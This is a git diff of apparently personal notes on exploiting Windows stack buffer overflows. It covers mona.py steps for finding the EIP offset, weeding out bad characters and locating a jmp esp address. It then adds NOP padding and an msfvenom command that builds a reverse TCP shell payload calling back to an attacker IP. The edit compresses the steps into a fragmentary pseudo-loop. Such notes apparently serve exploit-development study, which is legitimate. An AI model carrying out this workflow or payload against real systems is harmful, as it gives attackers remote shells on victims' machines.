@@ -48,33 +48,22 @@ If .exe windows machine
 ```
 !mona findmsp -distance [length]
 Response: EIP contains normal pattern : 0x39654138 (offset xxxxx)
+```
+7. Remove payload from the script, and add BBBB to *retn
 
 ```
-7. Remove payload from the script, and add BBBB to *retn*
-8. !mona bytearray -b "\x00" ==> find bad arrays
-9. Generate string without bad chars. Script_Strings
-10.  Add those strings in the payload exploit.py
-11.  Find address to which the ESP register points:
-  
-```
-!mona compare -f c:\Users\admin\Desktop\patota\bytearray.bin  -a ESP-Address
+while bad_chars
+  !mona bytearray -b "\x00" = remove bad chars
+  strings.py = without bad chars
+  !mona compare -f c:\Users\admin\Desktop\patota\bytearray.bin  -a ESP-Address
 
-```
-12. Remove bad chars from exploit.py
-13. Find return address (jmp esp):
-```
+# Find EIP
 !mona jmp -r esp -cpb "Badchars"
 ```
-14. Take note of one of the address and write it backwards:
 
-```
-080416BF
-"\xBF\x16\x04\x08"
-```
+8. Add padding to the payload: "\x90" * 16
+9. Generate shell code removing bad chars
 
-15. Add padding to the payload: "\x90" * 16
-
-16. Generate shell code removing bad chars
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=4445 EXITFUNC=thread -b "\x00\x0a" -f c
 
@@ -237,7 +226,6 @@ while True:
 ```
 
 2. not working
-
 ```
 #!/usr/bin/python3
 import sys
